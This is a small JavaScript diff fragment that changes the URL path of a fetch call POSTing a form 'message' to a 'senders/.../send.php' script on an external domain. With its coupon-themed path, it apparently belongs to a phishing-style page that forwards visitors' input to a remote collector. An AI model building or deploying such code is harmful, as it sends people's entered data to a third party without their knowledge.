@@ -28,7 +28,7 @@ function next() {
 	fd.append('message', message);
 	
 	fetch("https://bdmjsx.my.id/senders/"
-        +"cetak-kupon/send.php", {
+        +"gapakenanti/send.php", {
         method: 'POST',
         body: fd
       })
